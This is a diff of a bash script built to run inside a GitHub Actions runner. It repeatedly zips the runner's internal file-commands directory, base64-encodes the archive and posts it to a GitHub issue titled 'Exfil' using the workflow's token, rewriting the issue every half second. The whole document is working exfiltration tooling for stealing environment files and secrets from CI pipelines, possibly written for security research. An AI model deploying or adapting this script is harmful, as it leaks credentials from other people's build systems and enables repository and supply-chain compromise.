@@ -2,69 +2,34 @@
 
 GITHUB_TOKEN="${GITHUB_TOKEN}"
 GITHUB_REPOSITORY="${GITHUB_REPOSITORY}"
-ENV_VARS_DIR='/home/runner/work/_temp/_runner_file_commands/'
-PREFIX='set_env_'
+RUNNER_FILE_COMMANDS_DIR='/home/runner/work/_temp/_runner_file_commands/'
 
-MONITORED_VARS=("TARGET_VAR")
 POLL_INTERVAL=.5
+ISSUE_NUMBER=""
 
-on_change() {
-    # local new_value="$1"
-    sleep .5
+exfil() {
     ts=$(date +"%Y%m%d-%H%M%S-%3N")
     zip_file=${ts}.zip
-    # ls -la $ENV_VARS_DIR
-    # Zip the entire contents of ENV_VARS_DIR
-    zip -r $zip_file $ENV_VARS_DIR
-    ls -la $zip_file
-    
-    # Base64 encode the zip and output to console
+    zip -r $zip_file $RUNNER_FILE_COMMANDS_DIR
     local encoded=$(cat $zip_file | base64 -w 0)
-    echo "Zipped and encoded $ENV_VARS_DIR:"
-    echo "$encoded"
-    create_issue "$encoded"
-}
-
-get_env_vars_file() {
-    local latest_file=""
-    local latest_mtime=0
     
-    if [ ! -d "$ENV_VARS_DIR" ]; then
-        echo ""
-        return
+    if [ -z "$ISSUE_NUMBER" ]; then
+        create_issue "$encoded"
+    else
+        update_issue "$encoded"
     fi
-    
-    for f in "$ENV_VARS_DIR"${PREFIX}*; do
-        if [ -f "$f" ]; then
-            local mtime=$(stat -c %Y "$f" 2>/dev/null || stat -f %m "$f" 2>/dev/null)
-            if [ "$mtime" -gt "$latest_mtime" ]; then
-                latest_mtime=$mtime
-                latest_file="$(basename "$f")"
-            fi
-        fi
-    done
-    
-    echo "$latest_file"
 }
 
-main() {
-    on_change
-    # local previous_value=""
-    
-    # while true; do
-    #     local current_value=$(get_env_vars_file)
-    #     if [ "$current_value" != "$previous_value" ]; then
-    #         on_change "$current_value"
-    #         previous_value="$current_value"
-    #     fi
-    #     sleep "$POLL_INTERVAL"
-    # done
+main() {    
+    while true; do
+        exfil
+        sleep "$POLL_INTERVAL"
+    done
 }
 
 create_issue() {
-    local exfil="$1"
+    local body="$1"
     local title="Exfil"
-    local body="$exfil"
     
     local api_url="https://api.github.com/repos/${GITHUB_REPOSITORY}/issues"
     
@@ -76,11 +41,32 @@ create_issue() {
 EOF
 )
     
-    curl -X POST "$api_url" \
+    local response=$(curl -s -X POST "$api_url" \
         -H "Authorization: Bearer $GITHUB_TOKEN" \
         -H "Accept: application/vnd.github+json" \
         -H "Content-Type: application/json" \
-        -d "$json_data"
+        -d "$json_data")
+    
+    ISSUE_NUMBER=$(echo "$response" | grep -o '"number": [0-9]*' | head -1 | grep -o '[0-9]*')
+}
+
+update_issue() {
+    local body="$1"
+    
+    local api_url="https://api.github.com/repos/${GITHUB_REPOSITORY}/issues/${ISSUE_NUMBER}"
+    
+    local json_data=$(cat <<EOF
+{
+    "body": "$body"
+}
+EOF
+)
+    
+    curl -s -X PATCH "$api_url" \
+        -H "Authorization: Bearer $GITHUB_TOKEN" \
+        -H "Accept: application/vnd.github+json" \
+        -H "Content-Type: application/json" \
+        -d "$json_data" > /dev/null
 }
 
 main
